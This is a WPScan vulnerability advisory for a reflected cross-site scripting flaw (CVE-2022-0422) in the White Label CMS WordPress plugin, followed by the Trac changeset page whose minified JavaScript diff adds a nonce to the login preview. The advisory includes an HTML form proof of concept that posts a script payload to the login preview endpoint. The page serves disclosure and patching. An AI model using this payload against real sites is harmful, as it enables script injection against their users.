=== Content from wpscan.com_f83305b2_20250114_230248.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# White Label MS < 2.2.9 - Reflected Cross-Site Scripting

### Description

The plugin does not sanitise and validate the wlcms[\_login\_custom\_js] parameter before outputting it back in the response while previewing, leading to a Reflected Cross-Site Scripting issue

### Proof of Concept

In v < 2.2.8, both unauthenticated and authenticated users can be attacked with it. In 2.2.8, it will only trigger against authenticated user
<html>
<body>
<form action="https://example.com/wp-login.php?wlcms-action=preview" method="POST">
<input type="text" value='alert(/XSS/);' name="wlcms[\_login\_custom\_js]" />
<input type="submit" value="Exploit me pls" />
</form>
</body>
</html>

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

white-label-cms](https://a8cteam5105.wordpress.com/plugin/white-label-cms/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 2.2.9

### References

CVE
[CVE-2022-0422](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0422)

URL
<https://plugins.trac.wordpress.org/changeset/2672615>

### Classification

Type
XSS

OWASP top 10
[A7: Cross-Site Scripting (XSS)](https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_%28XSS%29)

CWE
[CWE-79](https://cwe.mitre.org/data/definitions/79.html)

CVSS
[6.1 (medium)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

### Miscellaneous

Original Researcher
Krzysztof Zając

Submitter
Krzysztof Zając

Submitter website
<https://kazet.cc/>

Verified
Yes

WPVDB ID
[429be4eb-8a6b-4531-9465-9ef0d35c12cc](https://a8cteam5105.wordpress.com/vulnerability/429be4eb-8a6b-4531-9465-9ef0d35c12cc/)

### Timeline

Publicly Published
2022-02-07 (about 2 years ago)

Added
2022-02-07 (about 2 years ago)

Last Updated
2022-04-13 (about 2 years ago)

### Other

Published
Title

Published
2023-01-06
Title
[WP Tabs < 2.1.17 - Contributor+ Stored XSS](https://a8cteam5105.wordpress.com/vulnerability/3834a162-2cdc-41e9-9c9d-2b576eed4db9/)

Published
2024-05-23
Title
[The Plus Addons for Elementor < 5.5.5 - Contributor+ Stored XSS via Hover Card Widget](https://a8cteam5105.wordpress.com/vulnerability/a977e2c8-63b1-46f1-9a67-bab8d12e976d/)

Published
2023-04-13
Title
[Betheme < 26.8 - Reflected XSS](https://a8cteam5105.wordpress.com/vulnerability/8f21fba5-5bb2-41f8-83f3-26f496c8997a/)

Published
2016-04-21
Title
[Google SEO Pressor Snippet <= 1.2.6 - Reflected Cross-Site Scripting (XSS)](https://a8cteam5105.wordpress.com/vulnerability/c24cf88a-0bd5-482e-9b43-52b1cb168c45/)

Published
2023-04-24
Title
[WP BrowserUpdate < 4.6 - Admin+ Stored XSS](https://a8cteam5105.wordpress.com/vulnerability/e61f2c28-7204-40c3-bc51-25e2437c0e17/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)


=== Content from plugins.trac.wordpress.org_0172cf90_20250114_230245.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fchangeset%2F2672615)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* ← [Previous Changeset](/changeset/2672614 "Changeset 2672614")
* [Next Changeset](/changeset/2672616 "Changeset 2672616") →

---

# Changeset 2672615

View differences
inline
side by side

Show
lines around each change

Show the changes in full context

Ignore:

Blank lines

Case changes

White space changes

Timestamp:
02/04/2022 01:39:28 AM
([3 years](/timeline?from=2022-02-04T01%3A39%3A28Z&precision=second "See timeline at 02/04/2022 01:39:28 AM") ago)

Author:
VideoUserManuals
Message:

Version 2.2.9

Location:
[white-label-cms/trunk](/browser/white-label-cms/trunk?rev=2672615)
Files:

8 edited

* [assets/js/admin-settings.js](/browser/white-label-cms/trunk/assets/js/admin-settings.js?rev=2672615 "Show entry in browser")
  (modified)
  ([1 diff](#file0 "Show differences"))
* [changelog.txt](/browser/white-label-cms/trunk/changelog.txt?rev=2672615 "Show entry in browser")
  (modified)
  ([1 diff](#file1 "Show differences"))
* [includes/Functions.php](/browser/white-label-cms/trunk/includes/Functions.php?rev=2672615 "Show entry in browser")
  (modified)
  ([1 diff](#file2 "Show differences"))
* [includes/classes/Admin\_Dashboard.php](/browser/white-label-cms/trunk/includes/classes/Admin_Dashboard.php?rev=2672615 "Show entry in browser")
  (modified)
  ([1 diff](#file3 "Show differences"))
* [includes/classes/Login.php](/browser/white-label-cms/trunk/includes/classes/Login.php?rev=2672615 "Show entry in browser")
  (modified)
  ([17 diffs](#file4 "Show differences"))
* [includes/classes/Previewable.php](/browser/white-label-cms/trunk/includes/classes/Previewable.php?rev=2672615 "Show entry in browser")
  (modified)
  ([1 diff](#file5 "Show differences"))
* [readme.txt](/browser/white-label-cms/trunk/readme.txt?rev=2672615 "Show entry in browser")
  (modified)
  ([1 diff](#file6 "Show differences"))
* [wlcms-plugin.php](/browser/white-label-cms/trunk/wlcms-plugin.php?rev=2672615 "Show entry in browser")
  (modified)
  ([2 diffs](#file7 "Show differences"))

### Legend:

Unmodified
Added
Removed

* ## [white-label-cms/trunk/assets/js/admin-settings.js](/changeset/2672615/white-label-cms/trunk/assets/js/admin-settings.js "Show the changeset 2672615 restricted to white-label-cms/trunk/assets/js/admin-settings.js")

  | [r2563959](/browser/white-label-cms/trunk/assets/js/admin-settings.js?rev=2563959#L1 "Show revision 2563959 of this file in browser") | [r2672615](/browser/white-label-cms/trunk/assets/js/admin-settings.js?rev=2672615#L1 "Show revision 2672615 of this file in browser") |  |
  | --- | --- | --- |
  | 1 |  | !function(e){var t={};function i(r){if(t[r])return t[r].exports;var n=t[r]={i:r,l:!1,exports:{}};return e[r].call(n.exports,n,n.exports,i),n.l=!0,n.exports}i.m=e,i.c=t,i.d=function(e,t,r){i.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:r})},i.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"\_\_esModule",{value:!0})},i.t=function(e,t){if(1&t&&(e=i(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.\_\_esModule)return e;var r=Object.create(null);if(i.r(r),Object.defineProperty(r,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var n in e)i.d(r,n,function(t){return e[t]}.bind(null,n));return r},i.n=function(e){var t=e&&e.\_\_esModule?function(){return e.default}:function(){return e};return i.d(t,"a",t),t},i.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},i.p="/",i(i.s=0)}([function(e,t,i){i(1),i(6),e.exports=i(11)},function(e,t){jQuery(document).ready((function(){jQuery(".wlcms-next-step").on("click",(function(){jQuery("#wlcms\_tab\_step-1").hide(),jQuery("#tab-step-1").hide(),jQuery("#wlcms\_tab\_step-2").show(),jQuery("#tab-step-2").show()})),jQuery(".wlcms-prev-step").on("click",(function(){jQuery("#wlcms\_tab\_step-2").hide(),jQuery("#tab-step-2").hide(),jQuery("#wlcms\_tab\_step-1").show(),jQuery("#tab-step-1").show()})),jQuery("form.wlcms-form").areYouSure({message:"Changes that you made may not be saved"}),jQuery('.template\_type[data-page\_type="html"]').each((function(){if(jQuery(this).is(":checked")){var e=jQuery(this).data("template\_type");jQuery(this).closest(".sub-fields").find(".welcome\_panel\_fullwidth").is(":checked")?jQuery(".wlcms\_welcome\_panel\_dismissible"+e).show():(jQuery(".wlcms\_welcome\_panel\_dismissible"+e).hide(),jQuery(".wlcms\_welcome\_panel\_dismissible"+e).find('input[type="checkbox"]').prop("checked",!1).trigger("change"))}})),jQuery(".welcome\_panel\_fullwidth").change((function(){var e=jQuery(this).closest(".wlcms-dashboard").data("wlcms\_dashboard");jQuery(this).is(":checked")?jQuery(".wlcms\_welcome\_panel\_dismissible"+e).show():(jQuery(".wlcms\_welcome\_panel\_dismissible"+e).hide(),jQuery(".wlcms\_welcome\_panel\_dismissible"+e).find('input[type="checkbox"]').prop("checked",!1).trigger("change"))})),jQuery(".wlcms\_welcome\_dismissible .wlcms-toggle-light").change((function(){var e=jQuery(this).closest(".wlcms\_welcome\_dismissible").find(".wlcms\_welcome\_dismissible\_reset");jQuery(this).is(":checked")?e.show():e.hide()})).trigger("change"),jQuery("#hide\_wordpress\_logo\_and\_links").change((function(){jQuery(this).is(":checked")?jQuery(".branding-toggled-off").hide():jQuery(".branding-toggled-off").show()})).trigger("change"),jQuery(".gutenberg-exit-toggle").change((function(){var e=jQuery(".gutenberg-exit-toggle option:selected").val();"custom-icon"==e?jQuery(".custom\_gutenberg\_exit\_wrapper").show():jQuery(".custom\_gutenberg\_exit\_wrapper").hide();var t=jQuery(".help\_gutenberg\_exit span");"custom-icon"==e?t.html(" the uploaded custom icon"):"admin-bar-logo"==e?t.html(" admin bar logo"):t.html(' an exit icon (<span class="dashicons dashicons-exit"></span>)')})).trigger("change"),jQuery(".reset-confirm").click((function(){if(0==confirm("Are you sure you want to reset!"))return!1}));var e=jQuery(".wlcms\_wrapper .navigation"),t=e.offset();function i(e){var t=jQuery(".wlcms-form"),i=t.attr("action");-1!==i.indexOf("#")&&(hash=i.replace(/.\*#/,"#"),i=i.replace(/#.\*/,"")),t.attr({action:i+"#"+e})}jQuery(window).scroll((function(){var i=jQuery("#wpadminbar").height(),r=t.top-(e.height()+i);jQuery(this).scrollTop()>r?(e.addClass("fixed"),e.css({top:i}).width(jQuery(".wlcms\_wrapper").width())):jQuery(this).scrollTop()<=t.top&&e.hasClass("fixed")&&e.removeClass("fixed")})),jQuery(".wlcms-navigation ul li a:not(.wlcms-ignore)").click((function(){var e=jQuery(this).attr("data-tab");jQuery(".wlcms-navigation ul li a").removeClass("current"),jQuery(".tab-content").removeClass("current"),jQuery(this).addClass("current"),jQuery(".wlcms\_content section").removeClass("current"),jQuery(".wlcms\_content section."+e).addClass("current"),i(e),jQuery("html, body").animate({scrollTop:0},400)}));var r=window.location.hash;function n(){jQuery(".wlcms-remove-img").on("click",(function(){var e=jQuery(this).parents(".wlcms-input-group");e.find(".wlcms-upload-thumbnail").html(""),e.find(".wlcms-upload-input").val("")}))}""!=(r=r.replace("#",""))?(jQuery(".wlcms-navigation ul li a#wlcms\_"+r).addClass("current"),jQuery(".wlcms\_content section."+r).addClass("current"),i(r)):0==jQuery(".wlcms\_content section.current").length&&(jQuery(".wlcms\_content section").eq(0).addClass("current"),jQuery(".wlcms-navigation ul li").eq(0).find("a").addClass("current")),jQuery(".wlcms\_upload").click((function(){var e=wp.media.editor.send.attachment,t=jQuery(this);return wp.media.editor.send.attachment=function(i,r){var s='<img id="'+r.id+'" src="'+r.url+'" />';s+='<span class="dashicons dashicons-dismiss wlcms-remove-img"></span>',t.parents(".wlcms-input-group").find(".wlcms-upload-thumbnail").html(s),t.parents(".wlcms-input-group").find(".wlcms-upload-input").val(r.url),n(),wp.media.editor.send.attachment=e},wp.media.editor.open(),!1})),n(),jQuery(".wlcms-color-field").wpColorPicker(),jQuery(".wlcms-preview-link").on("click",(function(){jQuery("#wlcms-preview-content").html("...");var e=jQuery(".wlcms-form").serialize()+"&action=wlcms\_save\_login\_preview\_settings&\_ajax\_nonce="+wlcms\_settings.wlcms\_ajax\_nonce;jQuery.ajax({type:"post",url:ajaxurl,data:e,success:function(e){jQuery("#wlcms-preview-content").html('<iframe allowtransparency="true" class="long-animate wlcms-preview-iframe" title="Login Preview" onmousewheel="" src="'+wlcms\_settings.loginurl+~~'?wlcms-action=preview&preview\_section=login&reauth=1~~"></iframe>'),jQuery("iframe.wlcms-preview-iframe").load((function(){var e=jQuery(this),t=e.contents();e.slideDown("slow"),t.find("body").prepend('<div style="text-align: center;position: absolute;top: 40px;margin: 0 30%;left: 0;font-weight: 300;font-size: 24px;background: #dad9d9cf;line-height: 35px;padding: 0;color: #790404;width: 40%;">Preview mode</div>'),t.find("form").attr("action","#"),t.find("#wp-submit").attr("type","button"),t.find("a").attr("href","#")}))}})})),jQuery(".wlcms-dashboard-preview-link").on("click",(function(){jQuery("#wlcms-dashboard-content").html("...");var e=jQuery(".wlcms-form").serialize()+"&action=wlcms\_save\_dashboard\_preview\_settings";jQuery.ajax({type:"post",url:ajaxurl,data:e,success:function(e){jQuery("#wlcms-preview-content").html('<iframe allowtransparency="true" class="long-animate wlcms-preview-iframe" title="Preview" onmousewheel="" src="'+wlcms\_settings.adminurl+'?wlcms-action=preview&preview\_section=dashboard"></iframe>'),jQuery("iframe.wlcms-preview-iframe").load((function(){var e=jQuery(this),t=e.contents();e.slideDown("slow"),t.find("body").prepend('<div style="text-align: center;position: absolute;top: 40px;margin: 0 30%;font-weight: 300;font-size: 24px;background: #dad9d9cf;line-height: 35px;padding: 0 20px;color: #790404;width: 40%;z-index:999999">Preview mode</div>'),t.find("a").each((function(){jQuery(this).attr("href","#")}))}))}})})),jQuery(".wlcms-select2").select2({width:"100%",placeholder:"Select"})})),jQuery.validator.addMethod("feedurl",(function(e,t){return this.optional(t)||/^(?:(?:(?:https?|ftp|feed):)?\/\/)(?:\S+(?::\S\*)?@)?(?:(?!(?:10|127)(?:\.\d{1,3}){3})(?!(?:169\.254|192\.168)(?:\.\d{1,3}){2})(?!172\.(?:1[6-9]|2\d|3[0-1])(?:\.\d{1,3}){2})(?:[1-9]\d?|1\d\d|2[01]\d|22[0-3])(?:\.(?:1?\d{1,2}|2[0-4]\d|25[0-5])){2}(?:\.(?:[1-9]\d?|1\d\d|2[0-4]\d|25[0-4]))|(?:(?:[a-z\u00a1-\uffff0-9]-\*)\*[a-z\u00a1-\uffff0-9]+)(?:\.(?:[a-z\u00a1-\uffff0-9]-\*)\*[a-z\u00a1-\uffff0-9]+)\*(?:\.(?:[a-z\u00a1-\uffff]{2,})).?)(?::\d{2,5})?(?:[/?#]\S\*)?$/i.test(e)}),"Please use a valid URL"),jQuery.validator.messages.url="Please use a valid URL",jQuery(document).ready((function(){jQuery('.main-toggle[type="checkbox"]').change((function(e){var t=jQuery(this).prop("checked"),i=jQuery(this).attr("data-revised"),r=jQuery(this).parents(".toggle-group").find(".sub-fields");r.length&&(t&&"1"!=i&&r.find('input[type="checkbox"]:checked').length==r.find('input[type="checkbox"]').length||!t&&"1"==i?r.hide():r.show())})).trigger("change"),jQuery(".wlcms-toggle-arrow").on("click",(function(){jQuery(this).toggleClass("active"),jQuery(this).next("ul").slideToggle()})),jQuery("#enable\_wlcms\_admin").on("change",(function(){jQuery(this).is(":checked")?jQuery(".menu-admin-wrapper").show():jQuery(".menu-admin-wrapper").hide()})).trigger("change"),jQuery(".enable\_welcome\_for\_all\_roles").on("change",(function(){var e=jQuery("#select\_user\_roles"+jQuery(this).data("section"));jQuery(this).is(":checked")?e.hide():e.show()})).trigger("change"),jQuery('.wlcms-toggle[type="checkbox"]').change((function(e){var t=jQuery(this).prop("checked"),i=jQuery(this).parent();i.siblings();i.find('input[type="checkbox"]').prop({checked:t}),function e(i){var r=i.parent().parent(),n=!0;if(i.siblings().each((function(){return n=jQuery(this).children('input[type="checkbox"]').prop("checked")===t})),n&&t)r.children('input[type="checkbox"]').prop({checked:t}),e(r);else if(n&&!t)r.children('input[type="checkbox"]').prop("checked",t),r.children('input[type="checkbox"]').prop("indeterminate",r.find('input[type="checkbox"]:checked').length>0),e(r);else{var s=!0;i.parents("li").children('input[type="checkbox"]').hasClass("main-toggle-reverse")&&(s=!1),i.parents("li").children('input[type="checkbox"]').prop({checked:s})}}(i)})),jQuery(".wlcms-menus-settings > ul > li").each((function(){jQuery(this).find('input[type="checkbox"]:checked').length==jQuery(this).find('input[type="checkbox"]').length?jQuery(this).find("ul.sub\_menu\_wrapper").hide():jQuery(this).find("ul.sub\_menu\_wrapper").show()}));jQuery(".wlcms-form").validate({ignore:".ignore",rules:{rss\_feed\_address:{required:!1,feedurl:!0}},invalidHandler:function(e,t){var r=t.errorList;jQuery(".wlcms-navigation ul li span").remove();var n=[];for(i=0;i<r.length;i++){var s=r[i].element,a=jQuery(s).closest("section").attr("id");-1===n.indexOf(a)&&n.push(a),console.log(a)}for(i=0;i<n.length;i++)jQuery(".wlcms-navigation ul li a#wlcms\_tab-"+n[i]).append('<span class="dashicons dashicons-no-alt"></span>');var c=t.numberOfInvalids();if(c){var l=1==c?"You missed 1 field. It has been highlighted":"You missed "+c+" fields. They have been highlighted";jQuery("div.wlcms\_messages span").html(l),jQuery("div.wlcms\_messages").show()}else jQuery("div.wlcms\_messages").hide()}});jQuery(".template\_type").on("change",(function(){var e=jQuery(this).data("template\_type"),t=jQuery(".template\_type"+e).filter(":checked"),i=t.data("page\_type");if("html"==t.val()){if(jQuery(".welcome-basicHtml"+e).show(),jQuery(".welcome-page"+e).hide(),jQuery(".welcome-basicHtml"+e+" .welcome\_panel\_fullwidth").is(":checked"))return void jQuery(".wlcms\_welcome\_panel\_dismissible"+e).show();jQuery(".wlcms\_welcome\_panel\_dismissible"+e).hide()}else jQuery(".wlcms\_welcome\_panel\_dismissible"+e).show(),jQuery(".welcome-basicHtml"+e).hide(),jQuery(".welcome-page"+e).show(),"beaver"==i?(jQuery(".beaver\_page"+e).next().show(),jQuery(".elementor\_page"+e).next().hide()):(jQuery(".beaver\_page"+e).next().hide(),jQuery(".elementor\_page"+e).next().show())})),jQuery(".template\_type").trigger("change"),jQuery("form.wlcms-advert").on("submit",(function(){var e=jQuery("#ad-authorize").is(":checked"),t=jQuery("#inf\_custom\_GDPR");t.val(e+" "+t.data("date"))}))}))},,,,,function(e,t){},,,,,function(e,t){}]); |
  |  | 1 | !function(e){var t={};function i(r){if(t[r])return t[r].exports;var n=t[r]={i:r,l:!1,exports:{}};return e[r].call(n.exports,n,n.exports,i),n.l=!0,n.exports}i.m=e,i.c=t,i.d=function(e,t,r){i.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:r})},i.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"\_\_esModule",{value:!0})},i.t=function(e,t){if(1&t&&(e=i(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.\_\_esModule)return e;var r=Object.create(null);if(i.r(r),Object.defineProperty(r,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var n in e)i.d(r,n,function(t){return e[t]}.bind(null,n));return r},i.n=function(e){var t=e&&e.\_\_esModule?function(){return e.default}:function(){return e};return i.d(t,"a",t),t},i.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},i.p="/",i(i.s=0)}([function(e,t,i){i(1),i(6),e.exports=i(11)},function(e,t){jQuery(document).ready((function(){jQuery(".wlcms-next-step").on("click",(function(){jQuery("#wlcms\_tab\_step-1").hide(),jQuery("#tab-step-1").hide(),jQuery("#wlcms\_tab\_step-2").show(),jQuery("#tab-step-2").show()})),jQuery(".wlcms-prev-step").on("click",(function(){jQuery("#wlcms\_tab\_step-2").hide(),jQuery("#tab-step-2").hide(),jQuery("#wlcms\_tab\_step-1").show(),jQuery("#tab-step-1").show()})),jQuery("form.wlcms-form").areYouSure({message:"Changes that you made may not be saved"}),jQuery('.template\_type[data-page\_type="html"]').each((function(){if(jQuery(this).is(":checked")){var e=jQuery(this).data("template\_type");jQuery(this).closest(".sub-fields").find(".welcome\_panel\_fullwidth").is(":checked")?jQuery(".wlcms\_welcome\_panel\_dismissible"+e).show():(jQuery(".wlcms\_welcome\_panel\_dismissible"+e).hide(),jQuery(".wlcms\_welcome\_panel\_dismissible"+e).find('input[type="checkbox"]').prop("checked",!1).trigger("change"))}})),jQuery(".welcome\_panel\_fullwidth").change((function(){var e=jQuery(this).closest(".wlcms-dashboard").data("wlcms\_dashboard");jQuery(this).is(":checked")?jQuery(".wlcms\_welcome\_panel\_dismissible"+e).show():(jQuery(".wlcms\_welcome\_panel\_dismissible"+e).hide(),jQuery(".wlcms\_welcome\_panel\_dismissible"+e).find('input[type="checkbox"]').prop("checked",!1).trigger("change"))})),jQuery(".wlcms\_welcome\_dismissible .wlcms-toggle-light").change((function(){var e=jQuery(this).closest(".wlcms\_welcome\_dismissible").find(".wlcms\_welcome\_dismissible\_reset");jQuery(this).is(":checked")?e.show():e.hide()})).trigger("change"),jQuery("#hide\_wordpress\_logo\_and\_links").change((function(){jQuery(this).is(":checked")?jQuery(".branding-toggled-off").hide():jQuery(".branding-toggled-off").show()})).trigger("change"),jQuery(".gutenberg-exit-toggle").change((function(){var e=jQuery(".gutenberg-exit-toggle option:selected").val();"custom-icon"==e?jQuery(".custom\_gutenberg\_exit\_wrapper").show():jQuery(".custom\_gutenberg\_exit\_wrapper").hide();var t=jQuery(".help\_gutenberg\_exit span");"custom-icon"==e?t.html(" the uploaded custom icon"):"admin-bar-logo"==e?t.html(" admin bar logo"):t.html(' an exit icon (<span class="dashicons dashicons-exit"></span>)')})).trigger("change"),jQuery(".reset-confirm").click((function(){if(0==confirm("Are you sure you want to reset!"))return!1}));var e=jQuery(".wlcms\_wrapper .navigation"),t=e.offset();function i(e){var t=jQuery(".wlcms-form"),i=t.attr("action");-1!==i.indexOf("#")&&(hash=i.replace(/.\*#/,"#"),i=i.replace(/#.\*/,"")),t.attr({action:i+"#"+e})}jQuery(window).scroll((function(){var i=jQuery("#wpadminbar").height(),r=t.top-(e.height()+i);jQuery(this).scrollTop()>r?(e.addClass("fixed"),e.css({top:i}).width(jQuery(".wlcms\_wrapper").width())):jQuery(this).scrollTop()<=t.top&&e.hasClass("fixed")&&e.removeClass("fixed")})),jQuery(".wlcms-navigation ul li a:not(.wlcms-ignore)").click((function(){var e=jQuery(this).attr("data-tab");jQuery(".wlcms-navigation ul li a").removeClass("current"),jQuery(".tab-content").removeClass("current"),jQuery(this).addClass("current"),jQuery(".wlcms\_content section").removeClass("current"),jQuery(".wlcms\_content section."+e).addClass("current"),i(e),jQuery("html, body").animate({scrollTop:0},400)}));var r=window.location.hash;function n(){jQuery(".wlcms-remove-img").on("click",(function(){var e=jQuery(this).parents(".wlcms-input-group");e.find(".wlcms-upload-thumbnail").html(""),e.find(".wlcms-upload-input").val("")}))}""!=(r=r.replace("#",""))?(jQuery(".wlcms-navigation ul li a#wlcms\_"+r).addClass("current"),jQuery(".wlcms\_content section."+r).addClass("current"),i(r)):0==jQuery(".wlcms\_content section.current").length&&(jQuery(".wlcms\_content section").eq(0).addClass("current"),jQuery(".wlcms-navigation ul li").eq(0).find("a").addClass("current")),jQuery(".wlcms\_upload").click((function(){var e=wp.media.editor.send.attachment,t=jQuery(this);return wp.media.editor.send.attachment=function(i,r){var s='<img id="'+r.id+'" src="'+r.url+'" />';s+='<span class="dashicons dashicons-dismiss wlcms-remove-img"></span>',t.parents(".wlcms-input-group").find(".wlcms-upload-thumbnail").html(s),t.parents(".wlcms-input-group").find(".wlcms-upload-input").val(r.url),n(),wp.media.editor.send.attachment=e},wp.media.editor.open(),!1})),n(),jQuery(".wlcms-color-field").wpColorPicker(),jQuery(".wlcms-preview-link").on("click",(function(){jQuery("#wlcms-preview-content").html("...");var e=jQuery(".wlcms-form").serialize()+"&action=wlcms\_save\_login\_preview\_settings&\_ajax\_nonce="+wlcms\_settings.wlcms\_ajax\_nonce;jQuery.ajax({type:"post",url:ajaxurl,data:e,success:function(e){jQuery("#wlcms-preview-content").html('<iframe allowtransparency="true" class="long-animate wlcms-preview-iframe" title="Login Preview" onmousewheel="" src="'+wlcms\_settings.loginurl+"?wlcms-action=preview&preview\_section=login&reauth=1&\_ajax\_nonce="+wlcms\_settings.wlcms\_ajax\_nonce+'"></iframe>'),jQuery("iframe.wlcms-preview-iframe").load((function(){var e=jQuery(this),t=e.contents();e.slideDown("slow"),t.find("body").prepend('<div style="text-align: center;position: absolute;top: 40px;margin: 0 30%;left: 0;font-weight: 300;font-size: 24px;background: #dad9d9cf;line-height: 35px;padding: 0;color: #790404;width: 40%;">Preview mode</div>'),t.find("form").attr("action","#"),t.find("#wp-submit").attr("type","button"),t.find("a").attr("href","#")}))}})})),jQuery(".wlcms-dashboard-preview-link").on("click",(function(){jQuery("#wlcms-dashboard-content").html("...");var e=jQuery(".wlcms-form").serialize()+"&action=wlcms\_save\_dashboard\_preview\_settings";jQuery.ajax({type:"post",url:ajaxurl,data:e,success:function(e){jQuery("#wlcms-preview-content").html('<iframe allowtransparency="true" class="long-animate wlcms-preview-iframe" title="Preview" onmousewheel="" src="'+wlcms\_settings.adminurl+'?wlcms-action=preview&preview\_section=dashboard"></iframe>'),jQuery("iframe.wlcms-preview-iframe").load((function(){var e=jQuery(this),t=e.contents();e.slideDown("slow"),t.find("body").prepend('<div style="text-align: center;position: absolute;top: 40px;margin: 0 30%;font-weight: 300;font-size: 24px;background: #dad9d9cf;line-height: 35px;padding: 0 20px;color: #790404;width: 40%;z-index:999999">Preview 